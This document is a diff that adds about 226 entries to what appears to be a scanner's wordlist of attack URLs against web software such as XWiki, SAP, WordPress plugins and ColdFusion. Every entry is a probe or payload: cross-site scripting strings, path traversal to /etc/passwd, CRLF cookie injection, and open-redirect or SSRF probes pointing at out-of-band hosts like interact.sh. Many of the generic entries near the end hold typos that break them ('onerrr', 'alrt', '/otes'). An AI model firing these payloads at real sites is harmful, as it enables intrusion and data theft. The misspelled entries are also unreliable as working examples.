@@ -703,3 +703,229 @@ preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(docu
 /wp-login.php?wp_lang=en_US%27
 /vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
 /tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
+/sap/bc/BSp/sap/menu/fameset.htm?sap--essioncmd=close&sapexiturl=https%3a%2f%2finteract.sh
+/examples/jsp/snp/snoop.jsp;<script>alert(document.domain)</script>test.jsp
+/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00
+/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open
+/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}
+/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00
+/process/feries.php?fichier=../../../../../../../etc/passwd
+/webadmin/reporter/view_server_log.php?act=stats&filename=log&offset=1&count=1&sortorder=0&filter=0&log=../../../../../../etc/passwd
+/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://interact.sh/
+/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd
+/novius-os/admin/nos/login?redirect=http://interact.sh
+/~user/%0D%0ASet-Cookie:crlfinjection
+/p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E
+/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+/wp-admin/admin.php/
+/path/to/rename/functionality?folder=<img src=/ onerror=alert(0);>
+/wp-content/themes/bello/readme.txt
+/?page</script><script>alert(document.domain)</script>
+/signin?from=https://interact.sh
+/signin?from=javascript:alert(document.cookie)
+/wp-admin/admin.php?page=Accessibility&%22%3E%3Cscript%3Ealert%28%22document_domain%22%29%3C/script%3E
+/editor_tools/module?type=%22%3E%3Cdiv%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/resource/md/get/url?url=http://oast.pro
+/wp-admin/admin-ajax.php
+/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoidmlkZW8iLCJ1cmwiOiJodHRwOi8vIiwidmlkZW9UeXBlIjoiaG9zdGVkIiwidmlkZW9QYXJhbXMiOnsib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikifX0=
+/index.hsp?m=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/ack_log.php
+/shib_logout.php?action=logout&return=https://oast.me
+/ilias/shib_logout.php?action=logout&return=https://oast.me
+{{paths}}
+/wa.exe?REPORT&z=4&
+/library/custom_template/share_template.php?list_id=1}});}}alert(document.domain);function%20x(){if(1){a=({a:{a:1
+/cpanelwebcall/<><img%20src=x%20onerror=
+/interface/forms/eye_mag/js/eye_base.php?providerID=%3Cimg%20src=x%20onerror=alert(document.domain);%3E
+/xwiki/authenticate/wiki/xwiki%22onload=%22alert(document.domain)%22/resetpassword
+/xwiki/bin/view/Main/?viewer=share&send=1&target=&target=%3Cimg+src+onerror%3Dalert%28document.domain%29%3E&includeDocument=inline&message={{randstr}}
+/xwiki/bin/get/FlamingoThemes/Cerulean?xpage=xpart&vm=delete.vm&xredirect=javascript:alert(document.domain)
+/bin/get/FlamingoThemes/Cerulean?xpage=xpart&vm=delete.vm&xredirect=javascript:alert(document.domain)
+/xwiki/bin/view/XWiki/Main?xpage=restore&showBatch=true&xredirect=javascript:alert(document.domain)
+/xwiki/bin/view/XWiki/Main?xpage=resubmit&resubmit=javascript:alert(document.domain)&xback=javascript:alert(document.domain)
+/bin/view/XWiki/Main?xpage=resubmit&resubmit=javascript:alert(document.domain)&xback=javascript:alert(document.domain)
+/xwiki/bin/get/FlamingoThemes/Cerulean?xpage=xpart&vm=previewactions.vm&xcontinue=javascript:alert(document.domain)
+/www/delivery/al.php?zoneid=1&layerstyle=geocities&closetext=%3Cscript%3Ealert(document.domain);%3C/script%3E
+/keepalive.php?caller=%22%3E%3Cimg+src%3d1+onerror%3dalert(document.domain)+%2F%3E&uq_mt=1664137650.085
+/home/courses?query=
+/index.hsp?passwordExpired=yes&username=\\
+/index.hsp?passwordExpired=yes&domainName=\\
+/index.hsp?m=
+/index.php?controller=pjAdmin&action=%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E
+/preview.php?theme=theme10dnel8%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3Eko0so
+/admin/twitter.php?active_t=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/opencms/cmisatom/cmis-online/type?id=1%27
+/Help.aspx?helpkey=xxxxxxx
+/{{string}}
+//{{string}}
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+/admin/home/login?admin_redirect_url=aHR0cDovL2xvY2FsaG9zdC9tb29zb2NpYWwvYWRtaW4vcGx1Z2lucw%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3etest
+/friends/ajax_invite?mode=model%27)%3balert(document.domain)%2f%2f;
+/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/xwiki/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E
+/bin/view/Main/?rev=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F15.5%25%25%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
+/xwiki/bin/view/Main/?rev=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F15.5%25%25%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
+/index.php
+/objects/functiongetOpenGraph.php?videoName=123+--><script>alert(document.domain)</script>
+/academy/tutor/filter?searched_word=acoa5\
+/Citrix/teststoreAuth/SamlTest
+/mobileredir/openApp.jsp?redirectUrl=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/mobileredir/openApp.jsp?user=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn=
+/api/api.php/<script>alert(document.domain)</script>
+/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p
+/about/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22%20onmousemove=alert(1)%20style=%22width:%20100000px;%20height:%20100000px;%20position:%20absolute;%20top:%20-10000px;%20left:%200;%22
+/site/about/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22%20onmousemove=alert(1)%20style=%22width:%20100000px;%20height:%20100000px;%20position:%20absolute;%20top:%20-10000px;%20left:%200;%22
+/data/v3/?key=%27-alert(document.domain)-%27
+/wp-content/plugins/base64-encoderdecoder/base64-decode.php?string=PHNjcmlwdD5hbGVydCgiZG9jdW1lbnQuZG9tYWluIik8L3NjcmlwdD4=
+/V1.0%3CsVg/onload=alert.bind%28%29%281%29%3E/Alarm/Exceptions/LinkageActions?=
+?url=ws://example.com/
+/furniture/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%2528
+/watch/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%2528
+/?meta=%3Csvg%2Fonload=confirm%28document.domain%29%3E
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror%E2%80%A9=alert(document.domain)%20src=1>%20METASCAN
+/bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://google.com
+/bitrixsetup.php?action=UNPACK&filename=<img src=
+/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/libs/dam/merge/metadata.css/test.html?path=/etc<img+src=x+onerror=alert(1);>&.ico
+/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a
+?protocol=efxtech.com&domain=efxtech.com&subdomain=efxtech.com&host=efxtech.com&pageurl=efxtech.com&url=efxtech.com
+?protocol=/%5cefxtech.com&domain=/%5cefxtech.com&subdomain=/%5cefxtech.com&host=/%5cefxtech.com&pageurl=/%5cefxtech.com&url=/%5cefxtech.com
+/index.php/test
+/_next/image?url=/\/\interact.sh/&q=100&w=128&h=128
+/__nuxt_error?stack=%0A{{url_encode(payload)}}
+/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
+/plugins/vkeyboard/vkeyboard.php?passformname={{url_encode(payload)}}
+/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/
+/?{{xss_param}}
+/OA_HTML/ibeCAcdLogin.jsp?username=ttttttttttt\
+/OA_HTML/ibeCAcdLogin.jsp?ref=ttttttttttt\
+/OA_HTML/ibeCAcpCustomLogin.jsp?ref=ttttttttttt\
+/OA_HTML/custibeCAcdPwdAssist.jsp?email=ttttttttttt\
+/search?q=<script>alert(
+/search?q=<img src=x onerror=alert(
+/search?q=<svg onload=alert(
+/search?query=<script>alert(
+/search?query=<img src=x onerror=alert(
+/search?query=<svg onload=alert(
+/query?input=<script>alert(
+/query?input=<img src=x onerror=alert(
+/query?input=<svg onload=alert(
+/test?param=<script>alert(
+/test?param=<img src=x onerror=alert(
+/test?param=<svg onload=alert(
+/search.php?searchString=<script>alert(
+/api/search?q=<script>alert(
+/api/search?q=<img src=x onerror=alert(
+/api/search?q=<svg onload=alert(
+/api/query?input=<script>alert(
+/api/query?input=<img src=x onerror=alert(
+/api/query?input=<svg onload=alert(
+/search/index.php?query=<script>alert(
+/search/index.php?query=<img src=x onerror=alert(
+/search/index.php?query=<svg onload=alert(
+/dat/search?input=<script>alert(
+/data/search?input=<img src=x onerror=alert(
+/data/search?input=<svg onload=alert(
+/catalog?search=<script>alert(
+/catalog?search=<img src=x onerror=alert(
+/catalog?search=<svg onload=alert(
+/products?query=<script>alert(
+/products?query=<img src=x onerror=alert
+/products?query=<svg onload=alert(
+/items?search=<script>alert(
+/items?search=<img src=x onerror=alert(
+/items?search=<svg onload=aler(
+/list?query=<script>alert(
+/list?query=<img src=x onerror=alert(
+/list?query=<svg onload=alert(
+/login?username=<script>alert(
+/login?username=<img src=x onerror=alert(
+/login?username=<svg onload=alert(
+/signin?user=<script>alert(
+/signin?user=<img src=x onerrr=alert(
+/signin?user=<svg onload=alert(
+/signup?email=<script>alert(
+/signup?email=<img src=x onerror=alert(
+/signup?email=<svg onloadalert(
+/register?email=<script>alert(
+/register?email=<img src=x onerror=alert(
+/register?email=<svg onload=alert(
+/subscribe?email=<scipt>alert(
+/subscribe?email=<img src=x onerror=alert(
+/subscribe?email=<svg onload=alert(
+/comment?text=<script>alert(
+/commenttext=<img src=x onerror=alert(
+/comment?text=<svg onload=alert(
+/post?message=<script>alert(
+/post?message=<img src=x onerror=alert(
+/post?message=<svg onload=alert(
+/feedback?content=<script>alert(
+/feedback?content=<img src=x onerror=alert(
+/feedback?content=<svg onload=alert(
+/report?description=<script>alert(
+/report?description=<img src=x onerror=alert(
+/report?description=<svg onload=alert(
+/contact?message=<script>alrt(
+/contact?message=<img src=x onerror=alert(
+/contact?message=<svg onload=alert(
+/inquiry?details=<script>alert(
+/inquiry?detils=<img src=x onerror=alert(
+/inquiry?details=<svg onload=alert(
+/request?info=<script>alert(
+/request?info=<img src=x onerror=alert(
+request?info=<svg onload=alert(
+/message?text=<script>alert(
+/message?text=<img src=x onerror=alert(
+/message?text=<svg onload=alert(
+/otes?content=<script>alert(
+/notes?content=<img src=x onerror=alert(
+/notes?content=<svg onload=alert(
+/update?info=<script>alert(
+/update?info=<img src=x onerror=alert(
+/update?info=<svg onload=alert(
+/user/search?name=<script>alert(
+/user/search?name=<img src=x onerror=alert(
+/user/search?name=<svg onload=alert(
+/profile/search?name=<script>alert(
+/profile/search?name=<img src=x onerror=alert(
+/profile/search?name=<svg onoad=alert(
+/account/search?user=<script>alert(
+/account/search?user=<img src=x onerror=alert(
+/account/search?user=<svg onload=alert(
+/ashboard/search?term=<script>alert(
+/dashboard/search?term=<img src=x onerror=alert(
+/dashboard/search?term=<svg onload=alert(
+/admin/search?query=<script>alert(
+/admin/search?query=<img src=x onerror=alert(
+/admin/search?query=<svg onload=alert(
+/portal/search?keyword=<script>alert(
+/porta/search?keyword=<img src=x onerror=alert(
+/portal/search?keyword=<svg onload=alert(
+/services/search?query=<script>alert(
+/services/search?query=<img src=x onerroralert(
+/services/search?query=<svg onload=alert(
+/search.php?query=<script>alert(
+/search.php?query=<img src=x onerror=alert(
+/search.php?query=<svg onload=alert(
+/search.php?searchString=<img src=x onerror=alert(
+/search.php?searchString=<svg onload=alert(
+/index.php?searchString=<script>alert(
+/index.php?searchString=<img src=x onerror=alert(
+/index.php?searchString=<svg onload=alert(
+/?reflected=1
+/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
+/zabbix/zabbix.php?action=dashboard.list
